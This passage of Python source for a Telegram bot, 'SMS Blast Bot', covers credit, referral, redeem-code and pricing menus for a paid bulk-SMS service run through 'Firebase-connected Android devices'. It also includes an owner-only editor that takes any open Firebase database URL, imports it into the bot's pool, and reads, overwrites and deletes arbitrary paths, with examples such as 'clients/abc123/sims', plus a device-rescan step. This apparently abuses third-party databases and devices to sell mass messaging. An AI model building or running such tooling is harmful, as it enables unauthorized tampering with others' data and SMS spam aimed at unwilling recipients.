                f"{em(EMOJI_WARNING, '⚠️')} <b>Credits Deducted!</b>\n\n-{amount} credits kat gaye.\n{em(EMOJI_MONEY, '💳')} Balance: <b>{_cd_bal}</b>"
            )
        except: pass
        await msg.answer(
            f"{em(EMOJI_CHECK, '✅')} <b>{amount} credits</b> deducted from <code>{uid}</code>!\n{em(EMOJI_MONEY, '💳')} New Balance: <b>{get_user_credits(uid, d)}</b>",
            reply_markup=kb([(f"{sc('back')}", "owner:home")]),
            parse_mode="HTML"
        )
    else:
        await msg.answer(
            f"{em(EMOJI_CROSS, '❌')} Insufficient credits! User ke paas sirf <b>{get_user_credits(uid, d)}</b> credits hain.",
            reply_markup=kb([(f"{sc('back')}", "owner:home")]),
            parse_mode="HTML"
        )

@R.callback_query(F.data == "owner:settings")
async def owner_settings(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    settings = d.get("settings", {})

    text = (
        f"{em(EMOJI_GEAR, '⚙️')} <b>Bot Settings</b>\n\n"
        f"{em(EMOJI_GIFT, '🎁')} Referral Credits: <b>{settings.get('ref_credits', 3)}</b>\n"
        f"{em(EMOJI_CROWN, '👑')} Max Owners: <b>{settings.get('max_owners', 6)}</b>\n\n"
        f"<i>Settings change karne ke liye niche se select karein.</i>"
    )
    rows = [
        [btn("sᴇᴛ rᴇғᴇrraʟ ᴄrᴇᴅɪᴛs", "owner:settings:ref", EMOJI_GIFT, "🎁")],
        [btn("ʙaᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")]
    ]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:settings:ref")
async def owner_settings_ref(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.set_ref_credits)
    await cq.message.edit_text(
        f"{em(EMOJI_GIFT, '🎁')} <b>Set Referral Credits</b>\n\nReferral pe kitne credits dena hai?\n<i>Example: 5</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:settings")]),
        parse_mode="HTML"
    )

@R.message(S.set_ref_credits, F.text)
async def owner_settings_ref_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        credits = int(msg.text.strip())
        if credits < 0: raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid positive number bhejo.", parse_mode="HTML")
        return

    d.setdefault("settings", {})["ref_credits"] = credits
    d["premium"]["ref_credits"] = credits
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Referral Credits Updated!</b>\n\nAb har referral pe <b>{credits}</b> credits milenge.",
        reply_markup=kb([(f"{sc('back')}", "owner:settings")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:activity")
async def owner_activity_log(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return

    log_entries = d.get("activity_log", [])[-20:]
    if not log_entries:
        text = f"{em(EMOJI_GEAR, '📜')} <b>Activity Log</b>\n\n<i>Koi activity nahi hai abhi tak.</i>"
    else:
        lines = [f"{em(EMOJI_GEAR, '📜')} <b>Recent Activity Log</b>\n"]
        for entry in reversed(log_entries):
            ts = fmt_time(entry.get("timestamp", 0))
            action = entry.get("action", "unknown")
            uid = entry.get("uid", 0)
            details = entry.get("details", "")
            lines.append(f"[{ts}] <code>{uid}</code> — <b>{action}</b> — {details}")
        text = "\n".join(lines)

    await cq.message.edit_text(
        text,
        reply_markup=kb([
            (f"{sc('refresh')}", "owner:activity"),
            (f"{sc('back')}", "owner:home")
        ]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:sms_history")
async def owner_sms_history(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return

    all_history = d.get("sms_history", {})
    total_entries = sum(len(v) for v in all_history.values())

    text = f"{em(EMOJI_STAR, '📋')} <b>Global SMS History</b>\n\nTotal Records: <b>{total_entries}</b>\n\n"
    text += "<i>Per-user history unke Stats mein available hai.</i>"

    await cq.message.edit_text(
        text,
        reply_markup=kb([(f"{sc('back')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data.in_({"user:home", "user:cancel"}))
async def user_home(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    uid = cq.from_user.id

    joined, missing = await user_joined_all(cq.bot, uid, d)
    if not joined:
        await cq.message.edit_text(force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True)
        return

    if is_owner(uid, d):
        await cq.message.edit_text(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
        return
    if is_admin(uid, d):
        await cq.message.edit_text(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
        return
    if not can_use(uid, d):
        await cq.message.edit_text(f"{em(EMOJI_CROSS, '⛔')} Access nahi hai!", parse_mode="HTML")
        return
    await cq.message.edit_text(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")

@R.callback_query(F.data == "user:credits")
async def user_credits(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    credits = get_user_credits(uid, d)
    _u_act, _u_days = unlimited_info(uid, d)
    if _u_act:
        unlimited_row = (f"🔓  <b>{sc('unlimited active')}</b> — {sc('permanent (sab)')}\n" if _u_days is None
                         else f"🔓  <b>{sc('unlimited active')}</b> — {_u_days} {sc('days left')}\n")
    else:
        unlimited_row = ""
    await cq.message.edit_text(
        f"💳 ◤{sc('credits')}◢\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"💰  <b>{sc('aapki balance')}</b>\n"
        f"     <b>{credits}</b>\n"
        f"{unlimited_row}"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{em(EMOJI_ROCKET, '📤')}  {sc('har number pe 1 credit')}\n"
        f"{em(EMOJI_GIFT, '🎁')}  {sc('redeem code se free credits')}\n"
        f"{em(EMOJI_STAR, '💸')}  {sc('dost se transfer bhi ho sakta hai')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"⚡ {sc('kya karna chahte ho?')} {em(EMOJI_GEAR, '⬇️')}",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [btn(f"💳 {sc('buy credits')}", "user:pricing", None, "")],
            [btn(f"🎁 {sc('redeem')}", "user:redeem", None, ""), btn(f"💸 {sc('transfer')}", "user:transfer", None, "")],
            [btn(f"🔙 {sc('back')}", "user:home", None, "")],
        ]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "user:redeem")
async def user_redeem_start(cq: CallbackQuery, state: FSMContext):
    await state.set_state(S.redeem_code)
    await cq.message.edit_text(
        f"{em(EMOJI_GIFT, '🎁')} <b>Redeem Code</b>\n\nApna redeem code enter karein:\n<i>Example: GIFTABC123</i>",
        reply_markup=kb([(f"{sc('cancel')}", "user:home")]),
        parse_mode="HTML"
    )

@R.message(S.redeem_code, F.text)
async def user_redeem_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    code = msg.text.strip().upper()
    await state.clear()

    codes = d.get("redeem_codes", {})
    if code not in codes:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid redeem code!", reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML")
        return

    code_data = codes[code]
    if code_data.get("uses_left", 0) <= 0:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Ye code expire ho gaya hai!", reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML")
        return

    if uid in code_data.get("used_by", []):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Aap pehle se ye code use kar chuke hain!", reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML")
        return

    credits = code_data["credits"]
    add_credits(uid, credits, d, is_manual=False)
    code_data["uses_left"] = code_data.get("uses_left", 1) - 1
    code_data.setdefault("used_by", []).append(uid)
    save(d)

    _rd_bal = get_user_credits(uid, d)
    await send_rich_or_fallback(
        msg.bot, uid,
        rich_credits_blocks("🎉 Redeem Successful!", [f"💰 +{credits} credits added!"], _rd_bal),
        f"{em(EMOJI_GIFT, '🎉')} <b>Redeem Successful!</b>\n\n{em(EMOJI_MONEY, '💰')} +{credits} credits added!\n{em(EMOJI_MONEY, '💳')} Balance: <b>{_rd_bal}</b>",
        reply_markup=kb([(f"{sc('home')}", "user:home")])
    )

@R.callback_query(F.data == "user:refer")
async def user_refer(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    # PROTECTED REFERRAL - link/code tabhi milega jab force-join join ho chuka ho
    if d.get("force_join", {}).get("enabled", False):
        joined, missing = await user_joined_all(cq.bot, uid, d)
        if not joined:
            await cq.message.edit_text(
                force_join_text(missing) + f"\n\n{em(EMOJI_GIFT, '🎁')} <b>Referral link/code join ke baad milega!</b>\n"
                f"Channels join karo, verify hote hi aapka referral link ready hoga.",
                reply_markup=force_join_kb(missing),
                parse_mode="HTML",
                disable_web_page_preview=True
            )
            return
    code = generate_user_refer_code(uid, d)
    save(d)
    ref_credits = d.get("settings", {}).get("ref_credits", 3)

    me = await cq.bot.get_me()
    my_refs = sum(1 for u in d.get("users", {}).values() if u.get("referred_by") == str(uid))
    _ref_kb = kb([(f"🔙 {sc('back')}", "user:home")])
    _ref_fallback = (
        f"👥 ◤{sc('refer')}◢  {sc('program')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{em(EMOJI_GIFT, '🎁')}  {sc('har referral pe')}  : <b>+{ref_credits}</b> {sc('credits')}\n"
        f"{em(EMOJI_STAR, '👥')}  {sc('aapke referrals')} : <b>{my_refs}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🎁  {sc('aapka code')}:  <code>{code}</code>\n"
        f"🔗  {sc('share link')}:\n"
        f"https://t.me/{me.username}?start={code}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"⚡ {sc('dost ko bhejo — dono ko bonus')} {em(EMOJI_ROCKET, '🚀')}"
    )
    _ref_blocks = [
        rb_heading("👥 Referral Program", 2),
        rb_para(f"🎁 Har referral pe: +{ref_credits} credits"),
        rb_para(f"👥 Aapke referrals: {my_refs}"),
        rb_divider(),
        rb_para(f"🎁 Aapka code: {code}"),
        rb_para(f"🔗 Share link: https://t.me/{me.username}?start={code}"),
        rb_divider(),
        rb_para("⚡ Dost ko bhejo — dono ko bonus 🚀"),
    ]
    await edit_rich_or_fallback(cq.message, _ref_blocks, _ref_fallback, reply_markup=_ref_kb)

@R.callback_query(F.data == "user:stats")
async def user_stats(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    udata = d["users"].get(str(uid), {})
    stats = d.get("stats", {})

    await cq.message.edit_text(
        f"{em(EMOJI_STAR, '📊')} <b>Your Stats</b>\n\n"
        f"{em(EMOJI_MONEY, '💰')} Credits: <b>{udata.get('credits', 0)}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} SMS Sent: <b>{udata.get('uses', 0)}</b>\n"
        f"{em(EMOJI_GEAR, '📅')} Joined: <b>{fmt_time(udata.get('joined_at', 0))}</b>\n\n"
        f"{em(EMOJI_STAR, '📈')} Bot Total Sent: <b>{stats.get('total_sent', 0)}</b>",
        reply_markup=kb([(f"{sc('back')}", "user:home")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "user:sms_history")
async def user_sms_history(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    history = d.get("sms_history", {}).get(str(uid), [])[-10:]

    if not history:
        text = f"{em(EMOJI_GEAR, '📜')} <b>Your SMS History</b>\n\n<i>Abhi tak koi SMS send nahi kiya.</i>"
    else:
        lines = [f"{em(EMOJI_GEAR, '📜')} <b>Your SMS History</b> (Last 10)\n"]
        for i, entry in enumerate(reversed(history), 1):
            ts = fmt_time(entry.get("timestamp", 0))
            num = entry.get("number", "Unknown")
            msg_preview = entry.get("message", "")[:30]
            status = entry.get("status", "unknown")
            status_icon = em(EMOJI_CHECK, "✅") if status == "sent" else em(EMOJI_CROSS, "🛑") if status == "stopped" else em(EMOJI_WARNING, "⏳")
            lines.append(f"{i}. [{ts}] {status_icon} <code>{mask_number(num)}</code> — {msg_preview}...")
        text = "\n".join(lines)

    await cq.message.edit_text(text, reply_markup=kb([(f"{sc('back')}", "user:home")]), parse_mode="HTML")

@R.callback_query(F.data == "user:pricing")
async def user_pricing(cq: CallbackQuery, state: FSMContext):
    d = load()
    plans = d.get("pricing", {}).get("plans", [])

    if not plans:
        await safe_answer(cq, "❌ Abhi koi plan available nahi!", show_alert=True)
        return

    dur_plans = [p for p in plans if p.get("type", "coins") == "duration"]
    coin_plans = [p for p in plans if p.get("type", "coins") != "duration"]

    text = f"💳 ◤{sc('pricing plans')}◢\n"
    text += "━━━━━━━━━━━━━━━━━━━━━━\n"
    if dur_plans:
        text += f"⏱ <b>{sc('duration plans')}</b>\n"
        for plan in dur_plans:
            unltxt = f"  🔓 {sc('unlimited')}" if plan.get("unlimited") else ""
            text += f"{em(EMOJI_STAR, '📋')}  <b>{plan['name']}</b>\n"
            text += f"      {em(EMOJI_MONEY, '💰')} <b>{plan['price']} {plan.get('currency', 'INR')}</b>   {em(EMOJI_GEAR, '⏱')} <b>{plan.get('days', 0)}</b> {sc('days')}{unltxt}\n"
            for f in (plan.get("features") or []):
                text += f"      ✦ {f}\n"
            text += "\n"
    if coin_plans:
        text += f"💰 <b>{sc('coins plans')}</b>\n"
        for plan in coin_plans:
            text += f"{em(EMOJI_STAR, '📋')}  <b>{plan['name']}</b> {sc('plan')}\n"
            text += f"      {em(EMOJI_MONEY, '💰')} <b>{plan['price']} {plan.get('currency', 'INR')}</b>   {em(EMOJI_GIFT, '🎁')} <b>+{plan.get('credits', 0)}</b> {sc('credits')}\n"
            for f in (plan.get("features") or []):
                text += f"      ✦ {f}\n"
            text += "\n"
    text += "━━━━━━━━━━━━━━━━━━━━━━\n"
    text += f"⚡ {sc('purchase ke liye neeche button dabao')}\n"

    rows = []
    for plan in plans:
        rows.append([btn_url(f"Buy {sc(plan['name'][:20])}", plan['payment_link'], EMOJI_MONEY, "💳")])
    rows.append([btn("🔙 ʙaᴄᴋ", "user:home", None, "")])

    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "user:info")
async def user_info(cq: CallbackQuery, state: FSMContext):
    await cq.message.edit_text(
        f"{em(EMOJI_GEAR, 'ℹ️')} <b>SMS Blast Bot {_VERSION}</b>\n\n"
        f"{em(EMOJI_GEAR, '🤖')} Bot for sending bulk SMS via Firebase-connected Android devices.\n\n"
        f"{em(EMOJI_CROWN, '👤')} Developer: <a href='{SUPER_ADMIN_LINK}'>{SUPER_ADMIN_NAME}</a>\n"
        f"{em(EMOJI_BELL, '💬')} Support: Contact owner ({SUPER_ADMIN_NAME}) for any issues.\n\n"
        f"<i>Bot use karne ke liye credits chahiye. Referral se free credits paayein!</i>",
        reply_markup=kb([(f"{sc('back')}", "user:home")]),
        parse_mode="HTML",
        disable_web_page_preview=True
    )

@R.callback_query(F.data == "noop")
async def noop(cq: CallbackQuery):
    await safe_answer(cq)


@R.callback_query(F.data == "owner:export_db")
async def owner_export_db(cq: CallbackQuery, state: FSMContext):
    uid = cq.from_user.id
    if not is_owner(uid, load()):
        await safe_answer(cq, "🚫 Owner only!", show_alert=True)
        return
    if not os.path.exists(_DATA_FILE):
        await safe_answer(cq, "❌ Database file abhi nahi bana!", show_alert=True)
        return
    d = load()
    ts = now_ist().strftime("%Y%m%d_%H%M%S")
    raw_size = os.path.getsize(_DATA_FILE)
    if raw_size > 20 * 1024 * 1024:
        # raw 20MB se bada hai toh import mein wapas aane ke liye .gz zaroori hai
        gz_path = f"blast_data_{ts}.json.gz"
        with open(_DATA_FILE, "rb") as f_in, gzip.open(gz_path, "wb") as f_out:
            shutil.copyfileobj(f_in, f_out)
        gz_size = os.path.getsize(gz_path)
        doc = FSInputFile(gz_path)
        size_line = f"🗜 <b>Size:</b> {_human_size(raw_size)} → <b>{_human_size(gz_size)}</b> (compressed .gz)"
        note = "<i>Ye .gz file 'Import DB' se wapas import kar sakte ho.</i>"
        remove_after = gz_path
    else:
        doc = FSInputFile(_DATA_FILE)
        size_line = f"💾 <b>Size:</b> {_human_size(raw_size)}"
        note = "<i>Isi file ko 'Import DB' se wapas import kar sakte ho.</i>"
        remove_after = None
    await cq.message.answer_document(
        document=doc,
        caption=(
            "📦 <b>Database Export</b>\n\n"
            f"👥 Users: {len(d.get('users', {}))} | 🔥 Firebase DBs: {len(d.get('firebases', []))}\n"
            f"📅 {ts}\n{size_line}\n\n{note}"
        ),
        parse_mode="HTML"
    )
    if remove_after and os.path.exists(remove_after):
        try:
            os.remove(remove_after)
        except Exception:
            pass
    await safe_answer(cq, "✅ DB export bhej diya!")


# =====================================================================
# 🔥 FIREBASE DB EDITOR (Owner) — URL se direct import + view + edit + delete
# =====================================================================

@R.callback_query(F.data == "owner:db_editor")
async def owner_db_editor_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    await safe_answer(cq, "🔥")
    await state.clear()
    await state.set_state(S.fb_editor_url)
    await cq.message.edit_text(
        f"{em(EMOJI_FIRE, '🔥')} <b>Firebase DB Editor</b>\n\n"
        f"Firebase DB ka URL bhejo (public/open DB):\n"
        f"<code>https://xxx-default-rtdb.firebaseio.com</code>\n\n"
        f"Bot use <b>direct import</b> karega aur view/edit/delete ka menu dega.",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )


async def _fb_editor_process_url(msg: Message, state: FSMContext, raw_url: str) -> bool:
    """URL validate + direct import + menu. Returns True if menu dikhaya."""
    url = raw_url.strip()
    if not _fb_base_ok(url):
        await msg.answer("❌ Sirf Firebase DB URL allowed (https + firebaseio.com / firebasedatabase.app). Dobara bhejo:", parse_mode="HTML")
        return False
    base = url.rstrip("/")
    status, _ = await fb_http(base, "")
    if status != 200:
        await msg.answer(f"❌ DB access nahi hua (HTTP {status}). URL/permissions check karo.", parse_mode="HTML")
        return False

    # DIRECT IMPORT: naya URL toh bot ke firebases mein add
    d = load()
    existing = {fb.get("url", "").rstrip("/") for fb in d.get("firebases", [])}
    imported = False
    if base not in existing:
        host = base.split("//", 1)[-1].split(".")[0]
        d["firebases"].append({"id": f"fed{int(time.time() * 1000)}", "url": base, "label": host[:24]})
        save(d)
        imported = True

    ok, overview, keys = await _fb_overview(base)
    if not ok:
        await msg.answer(f"❌ {overview}", parse_mode="HTML")
        return False

    imp_line = f"\n\n{em(EMOJI_CHECK, '📥')} <b>Direct import ho gaya</b> — ab ye DB bot ke firebases mein hai" if imported else ""
    await state.update_data(editor_url=base)
    await state.set_state(S.fb_editor_menu)
    await msg.answer(
        f"{em(EMOJI_FIRE, '🔥')} <b>Firebase DB Editor</b>\n<code>{base}</code>\n\n{overview}{imp_line}\n\n"
        f"<i>Key tap karke data dekho, ya neeche ke buttons se edit/delete karo:</i>",
        reply_markup=_fb_editor_menu_kb(keys),
        parse_mode="HTML"
    )
    return True


@R.message(S.fb_editor_url, F.text)
async def fb_editor_url_received(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        await msg.answer("🚫 Owner Only!", parse_mode="HTML")
        return
    await _fb_editor_process_url(msg, state, msg.text or "")


@R.message(S.fb_editor_menu, F.text)
async def fb_editor_menu_text(msg: Message, state: FSMContext):
    """Menu par naya URL bhejo = usi DB par switch ho jao."""
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        await msg.answer("🚫 Owner Only!", parse_mode="HTML")
        return
    txt = (msg.text or "").strip()
    if txt.startswith("http"):
        await _fb_editor_process_url(msg, state, txt)
    else:
        await msg.answer("Yahan sirf naya Firebase URL bhejo, ya menu buttons use karo.", parse_mode="HTML")


@R.callback_query(F.data == "fed:home")
async def fed_home(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫")
        return
    await state.clear()
    await safe_answer(cq)
    await cq.message.edit_text(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")


@R.callback_query(F.data.startswith("fed:key:"))
async def fed_view_key(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫")
        return
    fsmd = await state.get_data()
    base = fsmd.get("editor_url")
    if not base:
        await safe_answer(cq, "Session expire — DB Editor se dobara start karo", show_alert=True)
        return
    key = cq.data[len("fed:key:"):]
    if not _fb_path_ok(key):
        await safe_answer(cq, "Invalid key")
        return
    await safe_answer(cq, "⏳")
    status, data = await fb_http(base, key)
    if status != 200:
        try:
            await cq.message.answer(f"❌ Key read nahi hui (HTTP {status}).", parse_mode="HTML")
        except Exception:
            pass
        return
    await cq.message.answer(
        f"{em(EMOJI_STAR, '📄')} <b>Key:</b> <code>{key}</code>\n\n"
        f"<pre>{_json_view_html(data, 3500)}</pre>",
        parse_mode="HTML"
    )


@R.callback_query(F.data == "fed:raw")
async def fed_raw(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫")
        return
    fsmd = await state.get_data()
    base = fsmd.get("editor_url")
    if not base:
        await safe_answer(cq, "Session expire — DB Editor se dobara start karo", show_alert=True)
        return
    await safe_answer(cq, "⏳")
    status, data = await fb_http(base, "")
    if status != 200:
        try:
            await cq.message.answer(f"❌ Root read nahi hua (HTTP {status}).", parse_mode="HTML")
        except Exception:
            pass
        return
    await cq.message.answer(
        f"{em(EMOJI_STAR, '📄')} <b>Raw JSON</b> — <code>{base}</code>\n\n"
        f"<pre>{_json_view_html(data, 3500)}</pre>",
        parse_mode="HTML"
    )


@R.callback_query(F.data == "fed:edit")
async def fed_edit_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫")
        return
    fsmd = await state.get_data()
    base = fsmd.get("editor_url")
    if not base:
        await safe_answer(cq, "Session expire — DB Editor se dobara start karo", show_alert=True)
        return
    await safe_answer(cq)
    await state.set_state(S.fb_ed_path)
    await cq.message.edit_text(
        f"✏️ <b>Edit</b> — <code>{base}</code>\n\n"
        f"<b>Path bhejo</b> (jo modify karna hai):\n"
        f"<i>Example: <code>clients/abc123/sims</code> ya <code>settings/msg_delay</code></i>",
        reply_markup=kb([(f"{sc('cancel')}", "fed:home")]),
        parse_mode="HTML"
    )


@R.message(S.fb_ed_path, F.text)
async def fb_ed_path_received(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        await msg.answer("🚫 Owner Only!")
        return
    path = (msg.text or "").strip().strip("/")
    if not _fb_path_ok(path):
        await msg.answer("❌ Invalid path (max 200 chars, spaces/.. nahi). Dobara bhejo:")
        return
    fsmd = await state.get_data()
    base = fsmd.get("editor_url")
    if not base:
        await state.clear()
        await msg.answer("Session expire — DB Editor se dobara start karo.")
        return
    status, cur = await fb_http(base, path)
    cur_view = _json_view_html(cur, 1500) if status == 200 else "(ye path abhi exist nahi karta — naya ban jayega)"
    await state.update_data(ed_path=path)
    await state.set_state(S.fb_ed_value)
    await msg.answer(
        f"✏️ <b>Path:</b> <code>{path}</code>\n\n"
        f"<b>Current value:</b>\n<pre>{cur_view}</pre>\n\n"
        f"<b>Naya JSON value bhejo</b> (valid JSON — object/array/string/number):",
        reply_markup=kb([(f"{sc('cancel')}", "fed:home")]),
        parse_mode="HTML"
    )


@R.message(S.fb_ed_value, F.text)
async def fb_ed_value_received(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        await msg.answer("🚫 Owner Only!")
        return
    raw = (msg.text or "").strip()
    try:
        value = json.loads(raw)
    except Exception:
        await msg.answer("❌ Valid JSON nahi hai. Example: <code>{\"msg_delay\": 2}</code> — dobara bhejo:", parse_mode="HTML")
        return
    fsmd = await state.get_data()
    base = fsmd.get("editor_url")
    path = fsmd.get("ed_path")
    if not base or not path:
        await state.clear()
        await msg.answer("Session expire — DB Editor se dobara start karo.")
        return
    status, resp = await fb_http(base, path, method="PUT", payload=value)
    upd = 200 <= status < 300
    ok, overview, keys = await _fb_overview(base)
    if ok:
        await state.set_state(S.fb_editor_menu)
        res_line = (
            f"{em(EMOJI_CHECK, '✅')} <b>Updated:</b> <code>{path}</code>\n\n"
            if upd else
            f"{em(EMOJI_CROSS, '❌')} <b>Update fail</b> (HTTP {status}): <code>{str(resp)[:150]}</code>\n\n"
        )
        await msg.answer(
            res_line + f"{em(EMOJI_FIRE, '🔥')} <b>Editor</b> — <code>{base}</code>\n\n{overview}",
            reply_markup=_fb_editor_menu_kb(keys),
            parse_mode="HTML"
        )
    else:
        await msg.answer(
            (f"✅ <b>Updated:</b> <code>{path}</code>" if upd else f"❌ Update fail (HTTP {status}): {str(resp)[:150]}")
        )


@R.callback_query(F.data == "fed:del")
async def fed_del_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫")
        return
    fsmd = await state.get_data()
    base = fsmd.get("editor_url")
    if not base:
        await safe_answer(cq, "Session expire — DB Editor se dobara start karo", show_alert=True)
        return
    await safe_answer(cq)
    await state.set_state(S.fb_del_path)
    await cq.message.edit_text(
        f"🗑️ <b>Delete</b> — <code>{base}</code>\n\n"
        f"<b>Path bhejo jo DELETE karna hai</b> (⚠️ permanent!):\n"
        f"<i>Example: <code>clients/abc123</code></i>",
        reply_markup=kb([(f"{sc('cancel')}", "fed:home")]),
        parse_mode="HTML"
    )


@R.message(S.fb_del_path, F.text)
async def fb_del_path_received(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        await msg.answer("🚫 Owner Only!")
        return
    path = (msg.text or "").strip().strip("/")
    if not _fb_path_ok(path):
        await msg.answer("❌ Invalid path (max 200 chars, spaces/.. nahi). Dobara bhejo:")
        return
    fsmd = await state.get_data()
    base = fsmd.get("editor_url")
    if not base:
        await state.clear()
        await msg.answer("Session expire — DB Editor se dobara start karo.")
        return
    status, cur = await fb_http(base, path)
    cur_view = _json_view_html(cur, 1200) if status == 200 else "(path exist nahi karta)"
    await state.update_data(del_path=path)
    await msg.answer(
        f"⚠️ <b>Confirm:</b> <code>{path}</code> <b>DELETE</b> hoga?\n\n"
        f"<b>Current value:</b>\n<pre>{cur_view}</pre>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="✅ HAAN, DELETE karo", callback_data="fed:confirm_del"),
             InlineKeyboardButton(text="❌ Cancel", callback_data="fed:home")]
        ]),
        parse_mode="HTML"
    )


@R.callback_query(F.data == "fed:confirm_del")
async def fed_confirm_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫")
        return
    fsmd = await state.get_data()
    base = fsmd.get("editor_url")
    path = fsmd.get("del_path")
    if not base or not path:
        await state.clear()
        await safe_answer(cq, "Session expire", show_alert=True)
        return
    status, resp = await fb_http(base, path, method="DELETE")
    okc = 200 <= status < 300
    await state.update_data(del_path=None)
    await safe_answer(cq, "🗑️ Deleted!" if okc else f"❌ Fail (HTTP {status})")
    ok, overview, keys = await _fb_overview(base)
    if ok:
        await state.set_state(S.fb_editor_menu)
        res_line = (
            f"{em(EMOJI_CROSS, '🗑️')} <b>Deleted:</b> <code>{path}</code>\n\n"
            if okc else
            f"{em(EMOJI_CROSS, '❌')} <b>Delete fail</b> (HTTP {status})\n\n"
        )
        try:
            await cq.message.edit_text(
                res_line + f"{em(EMOJI_FIRE, '🔥')} <b>Editor</b> — <code>{base}</code>\n\n{overview}",
                reply_markup=_fb_editor_menu_kb(keys),
                parse_mode="HTML"
            )
        except TelegramBadRequest:
            pass


@R.callback_query(F.data == "fed:rescan")
async def fed_rescan(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫")
        return
    await safe_answer(cq, "🔄")
    ensure_scan_running()
    try:
        await cq.message.edit_text(
            "🔄 <b>Scan chalu ho gaya</b> (~3-4 min).\n\nComplete hone par button dabao:",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🔄 Check Now", callback_data="owner:check_devices")]
            ]),
            parse_mode="HTML"
        )
    except TelegramBadRequest:
        pass


@R.callback_query(F.data == "owner:backup_fb")
async def owner_backup_fb(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    await safe_answer(cq)
    url = get_backup_fb_url(d)
    if not url:
        await state.set_state(S.set_backup_fb)
        await cq.message.edit_text(
            "📦 <b>Backup Firebase Setup</b>\n\n"
            "Apni <b>public Firebase DB</b> ka URL bhejo:\n<code>https://xxx-default-rtdb.firebaseio.com</code>\n\n"
            "<i>Bot ka poora data isme hourly + har 15 min save pe push hota hai.\n"
            "Restart pe DB gayab/corrupt ho toh isi se AUTO-IMPORT hota hai — "
            "Render wipe se data safe.</i>\n\n"
